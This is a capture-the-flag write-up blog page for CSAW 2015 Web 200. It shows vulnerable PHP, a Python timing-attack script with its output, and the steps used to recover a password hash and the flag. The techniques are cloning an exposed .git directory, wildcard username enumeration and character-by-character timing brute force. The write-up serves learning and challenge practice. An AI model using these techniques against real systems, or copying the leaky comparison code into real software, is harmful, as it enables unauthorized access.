@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+  	<meta property="og:title" content=" CSAW CTF 2015 - Web 200 Writeup &middot;  Jordan Wright" />
+  	<meta property="og:site_name" content="Jordan Wright" />
+  	<meta property="og:url" content="http://jordan-wright.com/blog/2015/09/21/csaw-ctf-2015-web-200-writeup/" />
+
+    
+  	<meta property="og:type" content="article" />
+
+    <meta property="og:article:published_time" content="2015-09-21T00:00:00Z" />
+
+    
+    <meta property="og:article:tag" content="csaw2015" />
+    
+    <meta property="og:article:tag" content="ctf" />
+    
+    <meta property="og:article:tag" content="writeup" />
+    
+    
+
+  <title>
+     CSAW CTF 2015 - Web 200 Writeup &middot;  Jordan Wright
+  </title>
+
+    <meta name="description" content="Security and Programming Blog" />
+
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="shortcut icon" href="http://jordan-wright.com/blog/images/favicon.ico">
+	  <link rel="apple-touch-icon" href="http://jordan-wright.com/blog/images/apple-touch-icon.png" />
+
+    <link rel="stylesheet" type="text/css" href="http://jordan-wright.com/blog/css/screen.css" />
+    <link rel="stylesheet" type="text/css" href="http://jordan-wright.com/blog/css/nav.css" />
+    <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Merriweather:300,700,700italic,300italic|Open+Sans:700,400|Inconsolata" />
+
+
+    
+      
+          <link href="http://jordan-wright.com/blog/index.xml" rel="alternate" type="application/rss+xml" title="Jordan Wright" />
+      
+      
+    
+    <meta name="generator" content="Hugo 0.15" />
+
+    <link rel="canonical" href="http://jordan-wright.com/blog/2015/09/21/csaw-ctf-2015-web-200-writeup/" />
+
+    
+
+    
+</head>
+<body class="nav-closed">
+
+  <div class="nav">
+    <h3 class="nav-title">Menu</h3>
+    <a href="#" class="nav-close">
+        <span class="hidden">Close</span>
+    </a>
+    <ul>
+        
+        
+        
+            
+            <li class="nav-opened" role="presentation">
+            	<a href="http://jordan-wright.com/">Home</a>
+            </li>
+        
+            
+            <li class="nav-opened" role="presentation">
+            	<a href="http://jordan-wright.com/contact/">Contact</a>
+            </li>
+        
+            
+            <li class="nav-opened" role="presentation">
+            	<a href="http://jordan-wright.com/projects/">Projects</a>
+            </li>
+        
+            
+            <li class="nav-opened" role="presentation">
+            	<a href="http://jordan-wright.com/blog/">Blog</a>
+            </li>
+        
+            
+            <li class="nav-opened" role="presentation">
+            	<a href="http://raidersec.blogspot.com">Raidersec</a>
+            </li>
+        
+    </ul>
+    
+    
+    <a class="subscribe-button icon-feed" href="http://jordan-wright.com/blog/index.xml">Subscribe</a>
+    
+</div>
+<span class="nav-cover"></span>
+
+
+ <div class="site-wrapper">
+
+
+
+
+<header class="main-header post-head no-cover">
+  <nav class="main-nav clearfix">
+
+
+  
+      <a class="menu-button" href="#"><span class="burger">&#9776;</span><span class="word">Menu</span></a>
+  
+  </nav>
+</header>
+
+
+
+<main class="content" role="main">
+
+
+
+
+  <article class="post post">
+
+    <header class="post-header">
+        <h1 class="post-title">CSAW CTF 2015 - Web 200 Writeup</h1>
+        <small></small>
+
+        <section class="post-meta">
+        
+          <time class="post-date" datetime="2015-09-21T00:00:00Z">
+            Sep 21, 2015
+          </time>
+        
+         
+          <span class="post-tag small"><a href="http://jordan-wright.com/blog/tags/csaw2015/">#csaw2015</a></span>
+         
+          <span class="post-tag small"><a href="http://jordan-wright.com/blog/tags/ctf/">#ctf</a></span>
+         
+          <span class="post-tag small"><a href="http://jordan-wright.com/blog/tags/writeup/">#writeup</a></span>
+         
+        </section>
+    </header>
+
+    <section class="post-content">
+      <img src="/blog/images/headers/csaw_200.png" alt="" class="pure-img" >
+
+
+<p>Web 200 was a fun challenge that required us to chain together a few basic concepts to get the flag. When navigating to the URL given, we see that the challenge is based on a &ldquo;Lawn Care Simulator 2015&rdquo;.</p>
+
+<p><img src="/blog/images/blog/csaw2015/lawn_care.png"></p>
+
+<p>We can immediately see there&rsquo;s a sign in form, which might prove useful later. But before we get too far into that, let&rsquo;s view the page source. Opening up the source, we see the following javascript snippet:</p>
+
+<pre><code class="language-javascript">function init(){
+            document.getElementById('login_form').onsubmit = function() {
+                var pass_field = document.getElementById('password'); 
+                pass_field.value = CryptoJS.MD5(pass_field.value).toString(CryptoJS.enc.Hex);
+        };
+        $.ajax('.git/refs/heads/master').done(function(version){$('#version').html('Version: ' +  version.substring (0,6))});
+        initGrass();
+}
+</code></pre>
+
+<p>You&rsquo;ll notice that there&rsquo;s an ajax call being made to a <code>.git</code> directory. If this is a full Git repo, we should be able to clone it:</p>
+
+<pre><code class="language-bash">jordan@temp:~$ git clone http://54.175.3.248:8089/.git web200
+jordan@temp:~$ ls web200
+___HINT___  jobs.html  premium.php  validate_pass.php
+index.html  js         sign_up.php
+</code></pre>
+
+<p><em>Nice!</em> Now we can dive into the PHP. The <code>__HINT__</code> didn&rsquo;t prove to useful to me, but maybe I just didn&rsquo;t <em>get</em> it. Let&rsquo;s get started by looking at the relevant parts of <code>premium.php</code>.</p>
+
+<pre><code class="language-php">&lt;?php
+    require_once 'validate_pass.php';
+    require_once 'flag.php';
+    if (isset($_POST['password']) &amp;&amp; isset($_POST['username'])) {
+        $auth = validate($_POST['username'], $_POST['password']);
+        if ($auth){
+            echo &quot;&lt;h1&gt;&quot; . $flag . &quot;&lt;/h1&gt;&quot;;
+        }
+        else {
+            echo &quot;&lt;h1&gt;Not Authorized&lt;/h1&gt;&quot;;
+        }
+    }
+    else {
+        echo &quot;&lt;h1&gt;You must supply a username and password&lt;/h1&gt;&quot;;
+    }
+?&gt;
+</code></pre>
+
+<p>It looks like our flag is found in <code>flag.php</code>. Unfortunately, we don&rsquo;t have that file, but it looks like <code>$flag</code> is printed if we authenticate correctly.</p>
+
+<p>The authentication is handled by the <code>validate(username, password)</code> function in <code>validate_pass.php</code>. Let&rsquo;s see what it looks like:</p>
+
+<pre><code class="language-php">&lt;?php
+    &lt;snip&gt;
+    $user = mysql_real_escape_string($user);
+    $query = &quot;SELECT hash FROM users WHERE username='$user';&quot;;
+    $result = mysql_query($query) or die('Query failed: ' . mysql_error());
+    $line = mysql_fetch_row($result, MYSQL_ASSOC);
+    $hash = $line['hash'];
+
+    if (strlen($pass) != strlen($hash))
+        return False;
+
+    $index = 0;
+    while($hash[$index]){
+        if ($pass[$index] != $hash[$index])
+            return false;
+        # Protect against brute force attacks
+        usleep(300000);
+        $index+=1;
+    }
+    return true;
+    &lt;snip&gt;
+?&gt;
+</code></pre>
+
+<p>This function gets the password hash from the given username and then compares it character by character with the hash provided. Keep in mind, our password was hashed in Javascript in the snippet shown above.</p>
+
+<p>We&rsquo;ll get back to the password comparison later. First, how do we get the username? We have one more file, <code>sign_up.php</code> that might help. Let&rsquo;s take a look:</p>
+
+<pre><code class="language-php">&lt;?php
+    &lt;snip&gt;
+    $user = mysql_real_escape_string($_POST['username']);
+    // check to see if the username is available
+    $query = &quot;SELECT username FROM users WHERE username LIKE '$user';&quot;;
+    $result = mysql_query($query) or die('Query failed: ' . mysql_error());
+    $line = mysql_fetch_row($result, MYSQL_ASSOC);
+    if ($line == NULL){
+        // Signing up for premium is still in development
+        echo '&lt;h2 style=&quot;margin: 60px;&quot;&gt;Lawn Care Simulator 2015 is currently in a private beta. Please check back later&lt;/h2&gt;';
+    }
+    else {
+        echo '&lt;h2 style=&quot;margin: 60px;&quot;&gt;Username: ' . $line['username'] . &quot; is not available&lt;/h2&gt;&quot;;
+    }
+    &lt;snip&gt;
+?&gt;
+</code></pre>
+
+<p>This function tries to look up the username given and, if it exists, will tell us the username isn&rsquo;t available. We could try guessing (I did), but that doesn&rsquo;t help. Let&rsquo;s look more closely at the code.</p>
+
+<p>The SQL statement is done via a <code>LIKE</code> condition. This allows us to use the <code>%</code> character as a wildcard. So, by trying the username <code>%</code>, we should get the username from the database.</p>
+
+<p><img src="/blog/images/blog/csaw2015/username.png"></p>
+
+<p>Awesome - our username is <code>~~FLAG~~</code>. Now we need to find the password.</p>
+
+<p>Going back to the code given in <code>validate_pass.php</code>, we see the following comparison</p>
+
+<pre><code class="language-php">    while($hash[$index]){
+        if ($pass[$index] != $hash[$index])
+            return false;
+        # Protect against brute force attacks
+        usleep(300000);
+        $index+=1;
+    }
+</code></pre>
+
+<p>This snippet checks our hash against the one pulled from the databse. It does this by checking each character. If the character is wrong, it returns false immediately. However, look at what happens if the character is right. It does a <code>usleep(300000)</code>, which is .3 seconds. This means that, if we check every character, one will take longer. This is a <strong>timing attack</strong>.</p>
+
+<p>I wrote a quick script to exploit this. Here is the final (not very good) code I wound up using:</p>
+
+<pre><code class="language-text">import time
+import requests
+
+data = {
+	&quot;username&quot; : &quot;~~FLAG~~&quot;,
+	&quot;password&quot; : &quot;&quot;
+}
+
+url = &quot;http://54.175.3.248:8089/premium.php&quot;
+
+password = ['a']*32 
+
+def send_request(password):
+	data[&quot;password&quot;] = password
+	start = time.time()
+	requests.post(url, data=data)
+	end = time.time()
+	return end - start	
+
+hex = &quot;0123456789abcdef&quot;
+
+for i in range(32):
+	max_time = 0
+	char = &quot;&quot;
+	index = 0
+	for j in hex:
+		temp_pass = password
+		temp_pass[i] = j
+		request_time = send_request(&quot;&quot;.join(temp_pass))
+		if request_time &gt;= max_time:
+			index = i
+			max_time = request_time
+			char = j
+	password[index] = char	
+	print &quot;&quot;.join(password)
+</code></pre>
+
+<p>This basically brute forces the password by checking each valid hex character to see which takes the longest amount of time. It does this for each character in the hash. Running the code produces the following output:</p>
+
+<pre><code class="language-text">6aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+66aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+667aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+667eaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+667e2aaaaaaaaaaaaaaaaaaaaaaaaaaa
+667e21aaaaaaaaaaaaaaaaaaaaaaaaaa
+667e217aaaaaaaaaaaaaaaaaaaaaaaaa
+667e2176aaaaaaaaaaaaaaaaaaaaaaaa
+667e21766aaaaaaaaaaaaaaaaaaaaaaa
+667e217666aaaaaaaaaaaaaaaaaaaaaa
+667e217666aaaaaaaaaaaaaaaaaaaaaa
+667e217666a1aaaaaaaaaaaaaaaaaaaa
+667e217666a13aaaaaaaaaaaaaaaaaaa
+667e217666a13daaaaaaaaaaaaaaaaaa
+667e217666a13d3aaaaaaaaaaaaaaaaa
+667e217666a13d39aaaaaaaaaaaaaaaa
+667e217666a13d39aaaaaaaaaaaaaaaa
+667e217666a13d39a0aaaaaaaaaaaaaa
+667e217666a13d39a02aaaaaaaaaaaaa
+667e217666a13d39a023aaaaaaaaaaaa
+667e217666a13d39a0239aaaaaaaaaaa
+667e217666a13d39a02399aaaaaaaaaa
+667e217666a13d39a023995aaaaaaaaa
+667e217666a13d39a0239951aaaaaaaa
+667e217666a13d39a0239951eaaaaaaa
+667e217666a13d39a0239951efaaaaaa
+667e217666a13d39a0239951efeaaaaa
+667e217666a13d39a0239951efe2aaaa
+667e217666a13d39a0239951efe2daaa
+667e217666a13d39a0239951efe2deaa
+667e217666a13d39a0239951efe2de4a
+667e217666a13d39a0239951efe2de48
+</code></pre>
+
+<p>Now, all that&rsquo;s left is to login and get the flag. To bypass the javascript hashing, I just used the dev console (you could also do this in Python!):</p>
+
+<pre><code class="language-text">$.post('premium.php', {&quot;username&quot;: &quot;~~FLAG~~&quot;, &quot;password&quot; : &quot;667e217666a13d39a0239951efe2de48&quot;}).success(function(data){console.log(data)})
+&lt;head&gt;
+    &lt;title&gt;Lawn Care Simulator 2015&lt;/title&gt;
+    &lt;script src=&quot;//code.jquery.com/jquery-1.11.3.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js&quot;&gt;&lt;/script&gt; 
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1&gt;flag{gr0wth__h4ck!nG!1!1!&lt;/h1&gt;&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>And there we have the flag: <code>flag{gr0wth__h4ck!nG!1!1!}</code></p>
+
+<p>-Jordan (<a href="https://twitter.com/jw_sec">@jw_sec</a>)</p>
+
+    </section>
+
+
+  <footer class="post-footer">
+
+
+    
+    <figure class="author-image">
+        <a class="img" href="http://jordan-wright.com/blog/" style="background-image: url(http://jordan-wright.com/blog/images/jordan-wright-2-crop.jpg)"><span class="hidden">Jordan Wright's Picture</span></a>
+    </figure>
+    
+
+    
+
+
+
+
+
+<section class="author">
+  <h4><a href="http://jordan-wright.com/blog/">Jordan Wright</a></h4>
+  
+  <p>Security Researcher, Programmer, Time&#39;s 2006 Person of the Year</p>
+  
+  <div class="author-meta">
+    <span class="author-location icon-location">San Antonio, Texas</span>
+    
+  </div>
+</section>
+
+
+
+    
+<section class="share">
+  <h4>Share this post</h4>
+  <a class="icon-twitter" style="font-size: 1.4em" href="https://twitter.com/share?text=CSAW%20CTF%202015%20-%20Web%20200%20Writeup&amp;url=http%3a%2f%2fjordan-wright.com%2fblog%2f2015%2f09%2f21%2fcsaw-ctf-2015-web-200-writeup%2f"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+      <span class="hidden">Twitter</span>
+  </a>
+  <a class="icon-facebook" style="font-size: 1.4em" href="https://www.facebook.com/sharer/sharer.php?u=http%3a%2f%2fjordan-wright.com%2fblog%2f2015%2f09%2f21%2fcsaw-ctf-2015-web-200-writeup%2f"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+      <span class="hidden">Facebook</span>
+  </a>
+  <a class="icon-google-plus" style="font-size: 1.4em" href="https://plus.google.com/share?url=http%3a%2f%2fjordan-wright.com%2fblog%2f2015%2f09%2f21%2fcsaw-ctf-2015-web-200-writeup%2f"
+     onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+      <span class="hidden">Google+</span>
+  </a>
+</section>
+
+
+
+    
+
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+  var disqus_shortname = 'jordan-wright';
+  var disqus_url = 'http:\/\/jordan-wright.com\/blog\/2015\/09\/21\/csaw-ctf-2015-web-200-writeup\/';
+  (function() {
+    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+
+
+  </footer>
+</article>
+
+</main>
+    <footer class="site-footer clearfix">
+        <section class="copyright"><a href="">Jordan Wright</a> </section>
+        
+        <section class="poweredby">Proudly generated by <a class="icon-hugo" href="http://gohugo.io">HUGO</a>, with <a class="icon-theme" href="https://github.com/vjeantet/hugo-theme-casper">Casper</a> theme</section>
+        
+    </footer>
+    </div>
+    <script type="text/javascript" src="http://jordan-wright.com/blog/js/jquery.js"></script>
+    <script type="text/javascript" src="http://jordan-wright.com/blog/js/jquery.fitvids.js"></script>
+    <script type="text/javascript" src="http://jordan-wright.com/blog/js/index.js"></script>
+    
+</body>
+</html>
+
